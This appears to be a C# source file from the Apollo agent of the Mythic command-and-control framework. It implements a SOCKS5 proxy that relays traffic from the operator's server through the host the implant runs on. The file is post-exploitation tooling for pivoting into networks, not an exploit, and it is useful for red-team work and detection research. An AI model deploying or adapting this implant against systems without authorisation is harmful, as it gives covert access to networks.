#undef THREADING
#define THREADING

using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Apollo.SocksProxy.Classes;
using Mythic.Structs;
using System.Runtime.Serialization;
using System.Collections;
using Apollo.CommandModules;
using System.Windows.Forms;
using System.Runtime.Remoting.Contexts;
using static Utils.DebugUtils;
using static Utils.ByteUtils;
using Utils.ErrorUtils;

namespace Apollo.SocksProxy
{
    namespace Structs
    {
        public struct AuthContext
        {
            public int Method;
            public Dictionary<string, string> Payload;
        }

        public struct AddrSpec
        {
            public string FQDN;
            public IPAddress IP;
            public int Port;
        }

        public struct Request
        {
            public int Version;
            public int Command;
            public AuthContext AuthContext;
            public AddrSpec RemoteAddr;
            public AddrSpec DestAddr;
            //public ProxyConnection BufCon; // not right - needs revision
        }
    }
    namespace Enums
    {

        internal enum AddressType : uint
        {
            IPv4Address = 1,
            FQDNAddress = 3,
            IPV6Address = 4
        }
    }


    static class SocksController
    {

        public static bool IsActive()
        {
            return !exited;
        }

        public static Dictionary<int, ProxyConnection> proxyConnectionMap = new Dictionary<int, ProxyConnection>();

        private static bool exited = true;

        private static Queue sendToMythicQueue = new Queue();
        private static Queue syncSendToMythicQueue = Queue.Synchronized(sendToMythicQueue);

        private static Queue mythicServerDatagramQueue = new Queue();
        private static Queue syncMythicServerDatagramQueue = Queue.Synchronized(mythicServerDatagramQueue);

        public static Random rnd = new Random();
        public static string CONN_HOST = "mythic";
        public static int CONN_PORT = 3334;
        public static string CONN_TYPE = "tcp";
        public static int MESSAGE_SIZE = 512000;
        public static int MAX_MESSAGES = 500;
        public static int CONN_RECONNECT = 1000; // ms
        public static byte[] DisconnectMessageBytes = BitConverter.GetBytes(-1);

        public const int ConnectCommand = 1;
        public const int NoAuth = 0;
        public const int socks5Version = 5;
        public static IPAddress localhostIPAddr { get; } = IPAddress.Parse("127.0.0.1");


        private static Thread ReadFromMythicThread = null;
        private static Thread WriteToMythicThread = null;


        public static void StopClientPort()
        {
            exited = true;
            if (ReadFromMythicThread != null)
            {
                ReadFromMythicThread.Join();
                ReadFromMythicThread = null;
            }
            if (WriteToMythicThread != null)
            {
                WriteToMythicThread.Join();
                WriteToMythicThread = null;
            }
            ClearAllQueues();
        }

        private static void ClearAllQueues()
        {
            ClearProxyConnectionMap();
            ClearSendToMythicQueue();
            ClearDatagramQueue();
        }

        private static void ClearProxyConnectionMap()
        {
            ////DebugWriteLine("Requesting proxyConnectionMapMtx.");
            lock(proxyConnectionMap)
                proxyConnectionMap = new Dictionary<int, ProxyConnection>();
            ////DebugWriteLine("Released proxyConnectionMapMtx.");
        }

        private static void ClearDatagramQueue()
        {
            syncMythicServerDatagramQueue.Clear();
            ////DebugWriteLine("Releasing mythicServerDatagramMutex.");
        }

        private static void ClearSendToMythicQueue()
        {
            syncSendToMythicQueue.Clear();
            ////DebugWriteLine("Releasing sendToMythicQueueMutex.");
        }

        public static void StartClientPort()
        {
            if (ReadFromMythicThread != null)
            {
                exited = true;
                ReadFromMythicThread.Join();
            }
            exited = false;
            ReadFromMythicThread = new Thread(() => ReadFromMythic());
            //WriteToMythicThread = new Thread(()=>WriteToMythic());
            // t2 should be handled by another function on agent checkin
            //Thread t2 = new Thread(() => WriteToMythic(tcpClient));
            ReadFromMythicThread.Start();
            //WriteToMythicThread.Start();
            //t2.Start();
            //t1.Join();
            //t2.Join();
        }

        // Function responsible for adding messages to send to
        // the mythic server.
        public static void AddMythicMessageToQueue(SocksDatagram msg)
        {
            syncSendToMythicQueue.Enqueue(msg);
            ////DebugWriteLine("Releasing sendToMythicQueueMutex.");
        }

        // Function respponsible for fetching messages from
        // the queue so that they may be sent to the Mythic
        // server.
        public static SocksDatagram[] GetMythicMessagesFromQueue()
        {
            if (syncSendToMythicQueue.Count > 0)
            {
                ////DebugWriteLine("Requesting sendToMythicQueueMutex.");
                //sendToMythicQueueMutex.WaitOne();
                List<SocksDatagram> messages = new List<SocksDatagram>();
                //lock (sendToMythicQueue)
                //{
                while (syncSendToMythicQueue.Count > 0)
                    messages.Add((SocksDatagram)syncSendToMythicQueue.Dequeue());
                //}
                //sendToMythicQueueMutex.ReleaseMutex();
                ////DebugWriteLine("Releasing sendToMythicQueueMutex.");
                return messages.ToArray();
            }
            return new SocksDatagram[0];
        }

        public static void AddDatagramToQueue(SocksDatagram dg)
        {
            syncMythicServerDatagramQueue.Enqueue(dg);
        }

        private static object[] GetDatagramsFromQueue()
        {
            while (!exited)
            {
                if (syncMythicServerDatagramQueue.Count > 0)
                {
                    lock(syncMythicServerDatagramQueue)
                    {
                        var results = syncMythicServerDatagramQueue.ToArray();
                        syncMythicServerDatagramQueue.Clear();
                        return results;
                    }
                }
            }
            return null;
        }

        public static void AddProxy(ProxyConnection conn)
        {
            if (conn == null)
                return;
            //proxyConnectionMapMtx.WaitOne();
            proxyConnectionMap[conn.ServerID] = conn;
            //DebugWriteLine($"ProxyConnectionMap Count: {proxyConnectionMap.Count}");
            //proxyConnectionMapMtx.ReleaseMutex();
        }

        public static void SendDisconnect(int serverID)
        {
            var msg = new SocksDatagram()
            {
                server_id = serverID,
                data = Convert.ToBase64String(DisconnectMessageBytes)
            };
            AddMythicMessageToQueue(msg);
        }

        public static void OnProxyClose(int serverID)
        {
            SendDisconnect(serverID);
            RemoveProxyConnection(serverID);
        }

        //public static void AwaitConnectionDisconnect(ProxyConnection conn)
        //{
        //    if (conn == null)
        //        return;
        //    conn.ExitEvent.WaitOne();
        //    var msg = new SocksDatagram()
        //    {
        //        server_id = conn.ServerID,
        //        data = Convert.ToBase64String(DisconnectMessageBytes)
        //    };
        //    AddMythicMessageToQueue(msg);
        //}

        //public static void AwaitRemoveConnection(ProxyConnection conn)
        //{
        //    if (conn == null)
        //        return;
        //    conn.ExitEvent.WaitOne();
        //    //DebugWriteLine("Attempting to remove proxy!");
        //    RemoveProxyConnection(conn.ServerID);
        //}

        public static void CreateNewProxyConnection(int serverID, byte[] dg)
        {
            ProxyConnection conn = CreateProxy(serverID, dg);
            if (conn != null)
            {
                AddProxy(conn);
                conn.StartRelay();
                var msgToSend = CreateFormattedMessageWithLength(SocksError.SuccessReply, conn);
                AddMythicMessageToQueue(msgToSend);
            }
        }

        public static ProxyConnection GetProxyConnection(int channelID)
        {
            ProxyConnection result = null;
            ////DebugWriteLine("Requesting proxyConnectionMapMtx.");
            //proxyConnectionMapMtx.WaitOne();
            //DebugWriteLine($"Attempting to fetch connection with Channel ID: {channelID}...");
            if (proxyConnectionMap.TryGetValue(channelID, out result))
            {
                //DebugWriteLine($"Fetched connection with Channel ID: {channelID}!");
                return result;
            }
            else
            {
                //DebugWriteLine($"Failed fetch connection with Channel ID: {channelID}.");
                return null;
            }
        }

        public static void RemoveProxyConnection(int channelID)
        {
            //DebugWriteLine($"Attempting to remove Channel ID: {channelID}...");
            proxyConnectionMap.Remove(channelID);
            //DebugWriteLine($"Removed Channel ID: {channelID}");
        }

        public static ProxyConnection CreateProxy(int serverID, byte[] connectMsg)
        {
            ProxyConnection conn = null;
            try
            {
                //DebugWriteLine($"Attempting to create proxy for ServerID {serverID}...");
                conn = new ProxyConnection(serverID, connectMsg, OnProxyClose);
                //DebugWriteLine($"Created proxy connection for ServerID {serverID}!");
            }
            catch (SocksException ex)
            {
                //DebugWriteLine($"Failed to create ProxyConnection for ServerID {serverID}. Reason: {ex.Message} ({ex.ErrorCode})");
                switch (ex.ErrorCode)
                {
                    case SocksError.Disconnected:
                        new Thread(() => SendDisconnect(serverID)).Start();
                        break;
                    case SocksError.InvalidDatagram:
                        new Thread(() => SendDisconnect(serverID)).Start();
                        break;
                    default:
                        new Thread(() => SendError(serverID, ex.ErrorCode)).Start();
                        break;
                }
            }
            catch (Exception ex)
            {
                //DebugWriteLine($"Unhandled exception while creating new proxy connection to ServerID {serverID}: {ex.Message}");
                new Thread(() => SendDisconnect(serverID));
            }
            return conn;
        }

        private static void DispatchDatagram(object dg)
        {
            SocksDatagram curMsg = (SocksDatagram)dg;
            byte[] data;
            try
            {
                data = Convert.FromBase64String(curMsg.data);
            }
            catch (Exception ex)
            {
                //DebugWriteLine($"Error decoding data: {ex.Message}");
                return;
            }
            ProxyConnection conn = GetProxyConnection(curMsg.server_id);

            if (conn == null)
            {
                if (curMsg.data != "LTE=")
                {
                    CreateNewProxyConnection(curMsg.server_id, data);
                }
            }
            else
            {
                conn.EnqueueRequestData(data);
            }

        }

        private static void ReadFromMythic()
        {
            int count = 0;
            // these two vars might need to be in while loop
            int totalRead = 0;
            while (!exited)
            {
                SocksDatagram curMsg;
                var dgs = GetDatagramsFromQueue();
                if (dgs == null)
                    break;

                for (int i = 0; i < dgs.Length; i++)
                {
                    var t = new Thread(new ParameterizedThreadStart(DispatchDatagram));
                    t.Start(dgs[i]);
                }
            }
            // end while

        }


        public static void SendError(int serverID, SocksError resp = SocksError.HostUnreachable)
        {
            byte[] bytesToSend = CreateFormattedMessage(resp, new Structs.AddrSpec() { FQDN = "", IP = null, Port = -1 });
            var msg = new SocksDatagram()
            {
                server_id = serverID,
                data = Convert.ToBase64String(bytesToSend)
            };
            AddMythicMessageToQueue(msg);
        }

        private static SocksDatagram CreateFormattedMessageWithLength(SocksError resp, ProxyConnection conn)
        {
            byte[] bytesToSend = CreateFormattedMessage(resp, conn.Bind);
            var msg = new SocksDatagram()
            {
                server_id = conn.ServerID,
                data = Convert.ToBase64String(bytesToSend)
            };
            //string jsonMsg = JsonConvert.SerializeObject(msg);
            //byte[] jsonBytes = ASCIIEncoding.ASCII.GetBytes(jsonMsg);
            //byte[] length = BitConverter.GetBytes(jsonBytes.Length);
            //if (BitConverter.IsLittleEndian)
            //    Array.Reverse(length);
            //byte[] finalMsg = new byte[jsonBytes.Length + 4];
            //Array.Copy(length, finalMsg, length.Length);
            //Array.Copy(jsonBytes, 0, finalMsg, 4, jsonBytes.Length);
            return msg;
        }

        private static byte[] CreateFormattedMessage(SocksError resp, Structs.AddrSpec addr)
        {
            Enums.AddressType addrType;
            byte[] addrBody;
            UInt16 addrPort;

            byte[] msg;


            if (addr.FQDN == "" && addr.IP == null && addr.Port == -1)
            {
                addrType = Enums.AddressType.IPv4Address;
                addrBody = new byte[4];
                addrPort = 0;
                //return DisconnectMessageBytes;
            }
            else if (addr.FQDN != "")
            {
                addrType = Enums.AddressType.FQDNAddress;
                addrBody = ASCIIEncoding.ASCII.GetBytes(addr.FQDN);
                addrPort = (UInt16)addr.Port;
            }
            else if (addr.IP != null)
            {
                if (addr.IP.AddressFamily == AddressFamily.InterNetwork)
                {
                    addrType = Enums.AddressType.IPv4Address;
                    addrBody = addr.IP.GetAddressBytes();
                    addrPort = (UInt16)addr.Port;
                }
                else if (addr.IP.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    addrType = Enums.AddressType.IPV6Address;
                    addrBody = addr.IP.GetAddressBytes();
                    addrPort = (UInt16)addr.Port;
                }
                else
                {
                    //DebugWriteLine($"Failed to format address: {addr.IP.AddressFamily.ToString()}");
                    return new byte[1];
                }
            }
            else
            {
                //DebugWriteLine($"Failed to format address: {addr}");
                return new byte[1];
            }


            // Format the message
            msg = new byte[6 + addrBody.Length];
            msg[0] = socks5Version;
            msg[1] = BitConverter.GetBytes((uint)resp)[0];
            msg[2] = 0; // reserved
            msg[3] = BitConverter.GetBytes((uint)addrType)[0];
            Array.Copy(addrBody, 0, msg, 4, addrBody.Length);
            msg[msg.Length - 2] = (byte)(addrPort >> 8);
            msg[msg.Length - 1] = (byte)(addrPort & 0xff);

            return msg;

        }
    }
}
